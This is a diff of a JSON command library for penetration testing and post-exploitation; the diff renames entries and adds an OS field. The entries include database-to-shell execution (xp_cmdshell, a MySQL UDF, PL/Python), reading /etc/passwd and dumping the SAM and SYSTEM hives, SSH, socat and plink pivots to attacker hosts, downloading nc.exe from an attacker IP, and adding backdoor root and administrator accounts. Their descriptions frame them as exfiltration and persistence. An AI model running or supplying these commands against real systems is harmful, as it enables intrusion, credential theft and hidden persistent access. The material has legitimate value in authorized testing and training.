@@ -1,5 +1,5 @@
 {
-  "Version": "0.0.0.1",
+  "Version": "1.0.0.0",
   "Categories": [
     {
       "id": 0,
@@ -88,1306 +88,1523 @@
   ],
   "commands": [
     {
-      "Name": "Dump MySQL Table to File",
+      "Name": "Export MySQL Table to File",
       "Category": 18,
       "Description": "Export a MySQL table's contents to a server-side file using SELECT INTO OUTFILE, creating a dump for exfiltration or local analysis in Linux priv-esc chains.",
-      "Command": "SELECT * FROM table_name INTO OUTFILE '/tmp/dump.sql';"
+      "Command": "SELECT * FROM table_name INTO OUTFILE '/tmp/dump.sql';",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Run Shell Command MySQL UDF",
+      "Name": "Execute MySQL Shell UDF",
       "Category": 18,
       "Description": "Load a custom UDF to execute OS shell commands via MySQL if file privileges allow, enabling arbitrary command execution post-database compromise.",
-      "Command": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');"
+      "Command": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Read System File MySQL",
+      "Name": "Load System File into MySQL",
       "Category": 18,
       "Description": "Ingest a system file like /etc/passwd into a MySQL table using LOAD DATA INFILE for enumeration of user accounts in escalated DB access.",
-      "Command": "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';"
+      "Command": "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Dump MSSQL Table to File",
+      "Name": "Export MSSQL Table to File",
       "Category": 19,
       "Description": "Export MSSQL table data to a BCP file for offline analysis, leveraging xp_cmdshell or OPENROWSET to write dumps during cross-platform priv-esc.",
-      "Command": "EXEC xp_cmdshell 'bcp \"SELECT * FROM database.dbo.table_name\" queryout \"C:\\temp\\dump.txt\" -c -T';"
+      "Command": "EXEC xp_cmdshell 'bcp \"SELECT * FROM database.dbo.table_name\" queryout \"C:\\temp\\dump.txt\" -c -T';",
+      "OS": "Windows"
     },
     {
-      "Name": "Run Shell Command MSSQL",
+      "Name": "Execute MSSQL Shell Command",
       "Category": 19,
       "Description": "Execute arbitrary OS commands on the MSSQL host using xp_cmdshell, bridging database access to system shell for Linux-like escalation from Windows.",
-      "Command": "EXEC xp_cmdshell 'whoami';"
+      "Command": "EXEC xp_cmdshell 'whoami';",
+      "OS": "Windows"
     },
     {
-      "Name": "Read System File MSSQL",
+      "Name": "Read System File into MSSQL",
       "Category": 19,
       "Description": "Incorporate Windows system files like SAM or hosts into MSSQL queries via OPENROWSET for credential or config enumeration in pivoted environments.",
-      "Command": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=.;Trusted_Connection=yes;','BULK C:\\Windows\\System32\\drivers\\etc\\hosts');"
+      "Command": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=.;Trusted_Connection=yes;','BULK C:\\Windows\\System32\\drivers\\etc\\hosts');",
+      "OS": "Windows"
     },
     {
-      "Name": "Dump Postgres Table to File",
+      "Name": "Copy Postgres Table to File",
       "Category": 20,
       "Description": "Copy a PostgreSQL table's data to a CSV file on the server using COPY command, enabling file-based exfiltration in Linux priv-esc ops.",
-      "Command": "COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;"
+      "Command": "COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Run Shell Command Postgres",
+      "Name": "Execute Postgres Shell Command",
       "Category": 20,
       "Description": "Execute system commands via a custom PL/Python function or extension in PostgreSQL, turning DB access into shell execution for escalation.",
-      "Command": "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');"
+      "Command": "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Read System File Postgres",
+      "Name": "Read System File in Postgres",
       "Category": 20,
       "Description": "Read a system file like /etc/passwd directly into PostgreSQL output using pg_read_file, requiring superuser perms for sensitive file enumeration in priv-esc.",
-      "Command": "SELECT pg_read_file('/etc/passwd');"
+      "Command": "SELECT pg_read_file('/etc/passwd');",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MySQL Databases",
+      "Name": "List MySQL Databases",
       "Category": 18,
       "Description": "Enumerate all accessible databases in a MySQL instance, often running as a privileged service, to identify targets for data exfiltration during Linux privilege escalation.",
-      "Command": "SHOW DATABASES;"
+      "Command": "SHOW DATABASES;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Use MySQL Database",
+      "Name": "Select MySQL Database",
       "Category": 18,
       "Description": "Switch to a specific database context in MySQL to prepare for table enumeration and querying, facilitating deeper reconnaissance in post-exploitation scenarios.",
-      "Command": "USE database_name;"
+      "Command": "USE database_name;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MySQL Tables",
+      "Name": "List MySQL Tables",
       "Category": 18,
       "Description": "List all tables within the current MySQL database to map schema and pinpoint sensitive data stores exploitable via escalated database access.",
-      "Command": "SHOW TABLES;"
+      "Command": "SHOW TABLES;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Describe MySQL Table",
+      "Name": "Describe MySQL Table Structure",
       "Category": 18,
       "Description": "Display column details for a MySQL table to understand data structure and types, aiding in targeted SQL injection or dump operations during priv-esc.",
-      "Command": "DESCRIBE table_name;"
+      "Command": "DESCRIBE table_name;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MySQL Columns",
+      "Name": "List MySQL Table Columns",
       "Category": 18,
       "Description": "Retrieve column names and types from a MySQL table for schema analysis, essential for crafting precise queries in compromised database environments.",
-      "Command": "SHOW COLUMNS FROM table_name;"
+      "Command": "SHOW COLUMNS FROM table_name;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Select All MySQL Records",
+      "Name": "Query All MySQL Records",
       "Category": 18,
       "Description": "Query all records from a MySQL table to dump data, leveraging privileged DB access gained through Linux service exploitation for credential harvesting.",
-      "Command": "SELECT * FROM table_name;"
+      "Command": "SELECT * FROM table_name;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MySQL Users",
+      "Name": "List MySQL Users",
       "Category": 18,
       "Description": "Extract user accounts from MySQL's system tables to identify high-priv users or hashes for further escalation in integrated auth scenarios.",
-      "Command": "SELECT user, host FROM mysql.user;"
+      "Command": "SELECT user, host FROM mysql.user;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MySQL Processes",
+      "Name": "List MySQL Processes",
       "Category": 18,
       "Description": "List active MySQL connections and queries to spot admin sessions or inject into running processes during post-exploitation pivoting.",
-      "Command": "SHOW PROCESSLIST;"
+      "Command": "SHOW PROCESSLIST;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show MSSQL Databases",
+      "Name": "List MSSQL Databases",
       "Category": 19,
       "Description": "List all databases in an MSSQL instance via system views, targeting Windows-integrated services exploitable from Linux priv-esc for lateral data access.",
-      "Command": "SELECT name FROM sys.databases;"
+      "Command": "SELECT name FROM sys.databases;",
+      "OS": "Windows"
     },
     {
-      "Name": "Use MSSQL Database",
+      "Name": "Select MSSQL Database",
       "Category": 19,
       "Description": "Set the current database context in MSSQL to enable table and schema enumeration in compromised SQL Server environments during escalation chains.",
-      "Command": "USE database_name;"
+      "Command": "USE database_name;",
+      "OS": "Windows"
     },
     {
-      "Name": "Show MSSQL Tables",
+      "Name": "List MSSQL Tables",
       "Category": 19,
       "Description": "Enumerate tables from MSSQL's information schema to map database structure, crucial for identifying sensitive tables post-Linux-to-Windows pivot.",
-      "Command": "SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';"
+      "Command": "SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';",
+      "OS": "Windows"
     },
     {
-      "Name": "Show MSSQL Columns",
+      "Name": "List MSSQL Table Columns",
       "Category": 19,
       "Description": "Query column metadata in MSSQL for a specific table to analyze data types and constraints, supporting advanced querying in priv-esc dumps.",
-      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';"
+      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
+      "OS": "Windows"
     },
     {
-      "Name": "Select All MSSQL Records",
+      "Name": "Query All MSSQL Records",
       "Category": 19,
       "Description": "Retrieve all rows from an MSSQL table for data exfiltration, exploiting elevated DB perms obtained via service account compromise.",
-      "Command": "SELECT * FROM table_name;"
+      "Command": "SELECT * FROM table_name;",
+      "OS": "Windows"
     },
     {
-      "Name": "Show MSSQL Users",
+      "Name": "List MSSQL Users",
       "Category": 19,
       "Description": "List database users in MSSQL to uncover privileged accounts or roles for credential reuse in mixed Linux-Windows privilege escalation.",
-      "Command": "SELECT name FROM sys.database_principals;"
+      "Command": "SELECT name FROM sys.database_principals;",
+      "OS": "Windows"
     },
     {
-      "Name": "Show MSSQL Processes",
+      "Name": "List MSSQL Processes",
       "Category": 19,
       "Description": "Display active sessions and queries in MSSQL to detect and potentially hijack admin connections during post-exploitation reconnaissance.",
-      "Command": "SELECT * FROM sys.dm_exec_sessions;"
+      "Command": "SELECT * FROM sys.dm_exec_sessions;",
+      "OS": "Windows"
     },
     {
-      "Name": "Show Postgres Databases",
+      "Name": "List Postgres Databases",
       "Category": 20,
       "Description": "List all databases in PostgreSQL using system catalogs, targeting DB services with root-like access for initial mapping in Linux priv-esc.",
-      "Command": "\\l"
+      "Command": "\\l",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Connect to Postgres DB",
+      "Name": "Connect Postgres Database",
       "Category": 20,
       "Description": "Connect to a specific PostgreSQL database to switch context for further enumeration, enabling schema exploration post-escalation.",
-      "Command": "\\c database_name"
+      "Command": "\\c database_name",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show Postgres Tables",
+      "Name": "List Postgres Tables",
       "Category": 20,
       "Description": "Display tables in the current PostgreSQL schema to identify data targets, vital for dumping in compromised DB instances.",
-      "Command": "\\dt"
+      "Command": "\\dt",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Describe Postgres Table",
+      "Name": "Describe Postgres Table Structure",
       "Category": 20,
       "Description": "Output detailed structure of a PostgreSQL table, including columns and constraints, to inform targeted extractions during priv-esc.",
-      "Command": "\\d table_name"
+      "Command": "\\d table_name",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show Postgres Columns",
+      "Name": "List Postgres Table Columns",
       "Category": 20,
       "Description": "Query information schema in PostgreSQL for column details to understand table layout for precise SQL operations in escalated access.",
-      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';"
+      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Select All Postgres Records",
+      "Name": "Query All Postgres Records",
       "Category": 20,
       "Description": "Fetch all records from a PostgreSQL table for data harvesting, leveraging superuser perms gained through Linux service exploits.",
-      "Command": "SELECT * FROM table_name;"
+      "Command": "SELECT * FROM table_name;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show Postgres Users",
+      "Name": "List Postgres Users",
       "Category": 20,
       "Description": "Enumerate PostgreSQL roles and users to spot superusers or extract hashes for auth chaining in privilege escalation workflows.",
-      "Command": "SELECT rolname FROM pg_roles;"
+      "Command": "SELECT rolname FROM pg_roles;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Show Postgres Processes",
+      "Name": "List Postgres Processes",
       "Category": 20,
       "Description": "List active connections in PostgreSQL to identify ongoing sessions for potential takeover or monitoring in post-exploitation.",
-      "Command": "SELECT * FROM pg_stat_activity;"
+      "Command": "SELECT * FROM pg_stat_activity;",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Socat TCP Forward",
+      "Name": "Forward TCP with Socat",
       "Category": 9,
       "Description": "Establish a TCP port forward using socat to listen on local port 2222 and relay connections to a remote SSH server, enabling pivoting in post-exploitation phases of Linux privilege escalation.",
-      "Command": "socat -ddd TCP-LISTEN:2222,fork TCP:10.4.178.215:22"
+      "Command": "socat -ddd TCP-LISTEN:2222,fork TCP:10.4.178.215:22",
+      "OS": "Linux"
     },
     {
-      "Name": "SMB Port Scan",
+      "Name": "Scan SMB Ports with Netcat",
       "Category": 7,
       "Description": "Scan the 172.16.178.0/24 subnet for open SMB ports (445) using netcat to identify potential lateral movement targets during Linux priv-esc reconnaissance.",
-      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.16.178.$i 445; done"
+      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.16.178.$i 445; done",
+      "OS": "Linux"
     },
     {
-      "Name": "SSH Local Forward",
+      "Name": "SSH Local Port Forward",
       "Category": 9,
       "Description": "Set up an SSH local port forward to tunnel traffic from local port 4455 to a remote SMB service via a jump host, facilitating access to internal networks post-Linux escalation.",
-      "Command": "ssh -N -L 0.0.0.0:4455:172.16.178.217:445 dbadmin@10.4.178.215"
+      "Command": "ssh -N -L 0.0.0.0:4455:172.16.178.217:445 dbadmin@10.4.178.215",
+      "OS": "Linux"
     },
     {
-      "Name": "SSH Dynamic Proxy",
+      "Name": "SSH Dynamic SOCKS Proxy",
       "Category": 9,
       "Description": "Create a dynamic SOCKS proxy via SSH on local port 9999 for routing traffic through a compromised host, aiding in anonymous pivoting after Linux privilege escalation.",
-      "Command": "ssh -N -D 0.0.0.0:9999 dbadmin@10.4.178.215"
+      "Command": "ssh -N -D 0.0.0.0:9999 dbadmin@10.4.178.215",
+      "OS": "Linux"
     },
     {
-      "Name": "SSH Remote Forward SSH",
+      "Name": "SSH Remote SSH Forward",
       "Category": 9,
       "Description": "Configure an SSH remote port forward to expose a local SSH service on the remote host's port 2222, enabling inbound connections for further exploitation in Linux post-exploitation.",
-      "Command": "ssh -N -R 127.0.0.1:2222:10.4.50.215:22 kali@192.168.118.4"
+      "Command": "ssh -N -R 127.0.0.1:2222:10.4.50.215:22 kali@192.168.118.4",
+      "OS": "Linux"
     },
     {
-      "Name": "SSH Remote Proxy",
+      "Name": "SSH Remote Proxy Forward",
       "Category": 9,
       "Description": "Initiate an SSH remote port forward on port 9997 for proxy chaining, supporting persistent access and tool routing in Linux privilege escalation scenarios.",
-      "Command": "ssh -N -R 9997 kali@192.168.45.159 #remember to update proxy chains to 127.0.0.1 9997"
+      "Command": "ssh -N -R 9997 kali@192.168.45.159 #remember to update proxy chains to 127.0.0.1 9997",
+      "OS": "Linux"
     },
     {
-      "Name": "SSHuttle VPN Tunnel",
+      "Name": "SSHuttle Subnet Tunnel",
       "Category": 9,
       "Description": "Deploy sshuttle to create a VPN-like tunnel over SSH for specified subnets, allowing seamless traffic routing and lateral movement post-Linux escalation.",
-      "Command": "sshuttle -r database_admin@192.168.50.63:2222 10.4.178.0/24 172.16.178.0/24"
+      "Command": "sshuttle -r database_admin@192.168.50.63:2222 10.4.178.0/24 172.16.178.0/24",
+      "OS": "Linux"
     },
     {
-      "Name": "SSH Remote Forward",
+      "Name": "SSH Basic Remote Forward",
       "Category": 9,
       "Description": "Establish a basic SSH remote port forward on port 9997 to bridge networks and maintain access channels during Linux post-exploitation activities.",
-      "Command": "ssh -N -R 9997 kali@192.168.45.159"
+      "Command": "ssh -N -R 9997 kali@192.168.45.159",
+      "OS": "Linux"
     },
     {
-      "Name": "Plink RDP Forward",
+      "Name": "Plink RDP Port Forward",
       "Category": 17,
       "Description": "Use Plink to set up a remote port forward for RDP on port 9833, enabling Windows lateral movement from a Linux-compromised pivot in mixed-environment priv-esc chains.",
-      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.159"
+      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.159",
+      "OS": "Windows"
     },
     {
-      "Name": "Download Netcat",
+      "Name": "Download Netcat Executable",
       "Category": 17,
       "Description": "Download a netcat executable to a Windows temp directory using PowerShell wget, preparing for reverse shell or scanning tools in cross-platform Linux-to-Windows escalation.",
-      "Command": "wget -Uri http://192.168.45.159/nc.exe -OutFile C:\\Windows\\Temp\nc.exe"
+      "Command": "wget -Uri http://192.168.45.159/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe",
+      "OS": "Windows"
     },
     {
-      "Name": "Add Port Proxy",
+      "Name": "Add Windows Port Proxy",
       "Category": 17,
       "Description": "Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.",
-      "Command": "netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.178.64 connectport=4545 connectaddress=10.4.178.215"
+      "Command": "netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.178.64 connectport=4545 connectaddress=10.4.178.215",
+      "OS": "Windows"
     },
     {
-      "Name": "Show Port Proxies",
+      "Name": "List Windows Port Proxies",
       "Category": 17,
       "Description": "Display all configured port proxy rules on Windows to verify forwarding setups during mixed Linux-Windows privilege escalation verification.",
-      "Command": "netsh interface portproxy show all"
+      "Command": "netsh interface portproxy show all",
+      "OS": "Windows"
     },
     {
-      "Name": "Check Port Status",
+      "Name": "Check Specific Port Status",
       "Category": 14,
       "Description": "Examine network connections for a specific port (4545) using netstat to confirm listening services in Linux post-exploitation network enumeration.",
-      "Command": "netstat -anp TCP | find \"4545\""
+      "Command": "netstat -anp TCP | find \"4545\"",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Add Firewall Rule",
+      "Name": "Add Windows Firewall Rule",
       "Category": 17,
       "Description": "Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.",
-      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_4545\" protocol=TCP dir=in localip=192.168.178.64 localport=4545 action=allow"
+      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_4545\" protocol=TCP dir=in localip=192.168.178.64 localport=4545 action=allow",
+      "OS": "Windows"
     },
     {
-      "Name": "Delete Firewall Rule",
+      "Name": "Delete Windows Firewall Rule",
       "Category": 17,
       "Description": "Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.",
-      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_4545\""
+      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_4545\"",
+      "OS": "Windows"
     },
     {
-      "Name": "Delete Port Proxy",
+      "Name": "Delete Windows Port Proxy",
       "Category": 17,
       "Description": "Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.",
-      "Command": "netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.178.64"
+      "Command": "netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.178.64",
+      "OS": "Windows"
     },
     {
-      "Name": "Check User ID",
+      "Name": "Check Current User ID",
       "Category": 9,
       "Description": "Enumerate current user ID, groups, and privileges to identify initial access level and potential escalation paths in a compromised Linux environment.",
-      "Command": "id"
+      "Command": "id",
+      "OS": "Linux"
     },
     {
-      "Name": "Get Hostname",
+      "Name": "Get System Hostname",
       "Category": 0,
       "Description": "Retrieve the system's hostname for mapping the target during initial reconnaissance in privilege escalation assessments.",
-      "Command": "hostname"
+      "Command": "hostname",
+      "OS": "Win/Lin"
     },
     {
-      "Name": "Read Issue Banner",
+      "Name": "Read Login Banner",
       "Category": 0,
       "Description": "Display the login banner from /etc/issue to gather OS and environment details passively for targeted Linux priv-esc planning.",
-      "Command": "cat /etc/issue"
+      "Command": "cat /etc/issue",
+      "OS": "Linux"
     },
     {
-      "Name": "OS Release Info",
+      "Name": "Get OS Release Info",
       "Category": 0,
       "Description": "Extract distribution and version information from /etc/os-release to identify potential vulnerabilities and exploit compatibility in Linux systems.",
-      "Command": "cat /etc/os-release"
+      "Command": "cat /etc/os-release",
+      "OS": "Linux"
     },
     {
-      "Name": "Kernel Details",
+      "Name": "Show Kernel Details",
       "Category": 0,
       "Description": "Output kernel version, architecture, and build details via uname to scout for known kernel exploits during passive mapping.",
-      "Command": "uname -a"
+      "Command": "uname -a",
+      "OS": "Linux"
     },
     {
-      "Name": "Process List",
+      "Name": "List All Processes",
       "Category": 7,
       "Description": "List all running processes with user details to identify running services, potential injection points, and privilege mismatches for escalation.",
-      "Command": "ps aux"
+      "Command": "ps aux",
+      "OS": "Linux"
     },
     {
-      "Name": "Route List",
+      "Name": "Display Route Table",
       "Category": 3,
       "Description": "Display routing table interactively to map network topology and identify lateral movement opportunities in a Linux target.",
-      "Command": "routel"
+      "Command": "routel",
+      "OS": "Linux"
     },
     {
-      "Name": "IP Addresses",
+      "Name": "List IP Addresses",
       "Category": 3,
       "Description": "Enumerate all network interfaces and IP configurations for interactive network mapping and pivot identification in priv-esc chains.",
-      "Command": "ip a"
+      "Command": "ip a",
+      "OS": "Linux"
     },
     {
-      "Name": "Socket Status",
+      "Name": "Show Socket Status",
       "Category": 7,
       "Description": "Scan active network sockets and associated processes to detect listening services and connections for service enumeration in escalation.",
-      "Command": "ss -anp"
+      "Command": "ss -anp",
+      "OS": "Linux"
     },
     {
-      "Name": "IPTables Rules",
+      "Name": "Dump IPTables Rules",
       "Category": 14,
       "Description": "Dump IPv4 firewall rules to assess network restrictions and potential bypasses in a Linux post-exploitation scenario.",
-      "Command": "cat /etc/iptables/rules.v4"
+      "Command": "cat /etc/iptables/rules.v4",
+      "OS": "Linux"
     },
     {
-      "Name": "Cron Directories",
+      "Name": "List Cron Directories",
       "Category": 9,
       "Description": "List cron job directories and files to uncover scheduled tasks that may allow privilege escalation via writable cron entries.",
-      "Command": "ls -lah /etc/cron*"
+      "Command": "ls -lah /etc/cron*",
+      "OS": "Linux"
     },
     {
-      "Name": "User Crontab",
+      "Name": "List User Crontab",
       "Category": 9,
       "Description": "Display current user's crontab entries to identify automated jobs exploitable for persistent or elevated access in Linux environments.",
-      "Command": "crontab -l"
+      "Command": "crontab -l",
+      "OS": "Linux"
     },
     {
-      "Name": "Installed Packages",
+      "Name": "List Installed Packages",
       "Category": 1,
       "Description": "List all installed Debian packages to analyze application versions for known vulnerabilities in priv-esc reconnaissance.",
-      "Command": "dpkg -l"
+      "Command": "dpkg -l",
+      "OS": "Linux"
     },
     {
-      "Name": "Writable Dirs",
+      "Name": "Find Writable Directories",
       "Category": 9,
       "Description": "Find world-writable directories across the filesystem to locate upload points for malicious payloads in post-exploitation.",
-      "Command": "find / -writable -type d 2>/dev/null"
+      "Command": "find / -writable -type d 2>/dev/null",
+      "OS": "Linux"
     },
     {
-      "Name": "Mount Points",
+      "Name": "List Mount Points",
       "Category": 9,
       "Description": "Examine filesystem mount table to identify mounted volumes, shares, and potential noexec bypasses for escalation techniques.",
-      "Command": "cat /etc/fstab"
+      "Command": "cat /etc/fstab",
+      "OS": "Linux"
     },
     {
-      "Name": "Block Devices",
+      "Name": "List Block Devices",
       "Category": 9,
       "Description": "List block devices and partitions to map storage layout and detect encrypted or hidden volumes in Linux priv-esc.",
-      "Command": "lsblk"
+      "Command": "lsblk",
+      "OS": "Linux"
     },
     {
-      "Name": "Loaded Modules",
+      "Name": "List Loaded Modules",
       "Category": 9,
       "Description": "Enumerate loaded kernel modules to spot drivers vulnerable to exploits or version-specific weaknesses.",
-      "Command": "lsmod"
+      "Command": "lsmod",
+      "OS": "Linux"
     },
     {
-      "Name": "Module Info",
+      "Name": "Query Module Info",
       "Category": 14,
       "Description": "Query details on the libata kernel module to assess for storage-related exploits in targeted priv-esc paths.",
-      "Command": "/sbin/modinfo libata"
+      "Command": "/sbin/modinfo libata",
+      "OS": "Linux"
     },
     {
-      "Name": "SUID Binaries",
+      "Name": "Find SUID Binaries",
       "Category": 9,
       "Description": "Locate setuid executables system-wide to identify privilege escalation vectors via misconfigured SUID files.",
-      "Command": "find / -perm -u=s -type f 2>/dev/null"
+      "Command": "find / -perm -u=s -type f 2>/dev/null",
+      "OS": "Linux"
     },
     {
-      "Name": "Environment Vars",
+      "Name": "Dump Environment Variables",
       "Category": 9,
       "Description": "Dump environment variables to reveal paths, credentials, or configs exploitable for further escalation in Linux shells.",
-      "Command": "env"
+      "Command": "env",
+      "OS": "Linux"
     },
     {
-      "Name": "Sudo Permissions",
+      "Name": "List Sudo Permissions",
       "Category": 8,
       "Description": "List allowed sudo commands to scout for misconfigurations enabling initial privilege escalation attempts.",
-      "Command": "sudo -l"
+      "Command": "sudo -l",
+      "OS": "Linux"
     },
     {
-      "Name": "Root Shell",
+      "Name": "Attempt Root Shell",
       "Category": 8,
       "Description": "Attempt interactive root shell via sudo for direct privilege escalation if permissions allow.",
-      "Command": "sudo -i"
+      "Command": "sudo -i",
+      "OS": "Linux"
     },
     {
-      "Name": "Monitor Processes",
+      "Name": "Monitor Running Processes",
       "Category": 9,
       "Description": "Continuously watch processes for user related activity during post-exploitation sniffing.",
-      "Command": "watch -n 1 \"ps -aux | grep '\\['\""
+      "Command": "watch -n 1 \"ps -aux | grep '\\['\"",
+      "OS": "Linux"
     },
     {
-      "Name": "Sniff Loopback",
+      "Name": "Sniff Loopback Traffic",
       "Category": 9,
       "Description": "Use sudo to capture and grep loopback traffic for plaintext passwords in local inter-process communications.",
-      "Command": "sudo tcpdump -i lo -A | grep \"pass\""
+      "Command": "sudo tcpdump -i lo -A | grep \"pass\"",
+      "OS": "Linux"
     },
     {
-      "Name": "Cron Logs",
+      "Name": "Search Cron Logs",
       "Category": 9,
       "Description": "Search syslog for cron execution logs to correlate scheduled jobs with potential escalation timestamps.",
-      "Command": "grep \"CRON\" /var/log/syslog"
+      "Command": "grep \"CRON\" /var/log/syslog",
+      "OS": "Linux"
     },
     {
       "Name": "Add Backdoor User",
       "Category": 9,
       "Description": "Append a new root-equivalent user to /etc/passwd for persistent backdoor access post-privilege escalation.",
-      "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd"
+      "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd",
+      "OS": "Linux"
     },
     {
-      "Name": "File Capabilities",
+      "Name": "List File Capabilities",
       "Category": 9,
       "Description": "Recursively enumerate file capabilities to uncover binaries with elevated privileges without traditional SUID.",
-      "Command": "/usr/sbin/getcap -r / 2>/dev/null"
+      "Command": "/usr/sbin/getcap -r / 2>/dev/null",
+      "OS": "Linux"
     },
     {
-      "Name": "Kernel Version",
+      "Name": "Get Kernel Version",
       "Category": 0,
       "Description": "Extract kernel release version for passive identification of exploitable kernel flaws in Linux mapping.",
-      "Command": "uname -r"
+      "Command": "uname -r",
+      "OS": "Linux"
     },
     {
-      "Name": "System Arch",
+      "Name": "Get System Architecture",
       "Category": 0,
       "Description": "Determine system architecture to tailor exploits and payloads for architecture-specific vulnerabilities.",
-      "Command": "arch"
+      "Command": "arch",
+      "OS": "Linux"
     },
     {
-      "Name": "File Type Check",
+      "Name": "Check File Type",
       "Category": 14,
       "Description": "Identify file type of a test file to verify binaries or scripts for exploitation in misc Linux priv-esc tasks.",
-      "Command": "file test-file"
+      "Command": "file test-file",
+      "OS": "Linux"
     },
     {
-      "Name": "Reg",
+      "Name": "Save SAM System Files",
       "Category": 17,
       "Description": "Save SAM and SYSTEM files",
-      "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2"
+      "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2",
+      "OS": "Windows"
     },
     {
-      "Name": "SC",
+      "Name": "List Non-System32 Services",
       "Category": 17,
       "Description": "List all services that aren't in the System32 directory",
-      "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\""
+      "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\"",
+      "OS": "Windows"
     },
     {
-      "Name": "NET",
+      "Name": "Create Backdoor Admin",
       "Category": 17,
       "Description": "Create a windows backdoor admin account",
-      "Command": "ett user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add"
+      "Command": "net user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add",
+      "OS": "Windows"
     },
     {
-      "Name": "SCHTASKS",
+      "Name": "List User Scheduled Tasks",
       "Category": 17,
       "Description": "List all scheduled tasks that have executables under C:\\Users*",
-      "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }"
+      "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }",
+      "OS": "Windows"
     },
     {
-      "Name": "WMIC",
+      "Name": "List Unquoted Path Services",
       "Category": 17,
       "Description": "List all services that have unquoted paths",
-      "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }'"
+      "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }",
+      "OS": "Windows"
     },
     {
-      "Name": "Powershell",
+      "Name": "Download File PowerShell",
       "Category": 15,
       "Description": "Download file to windows",
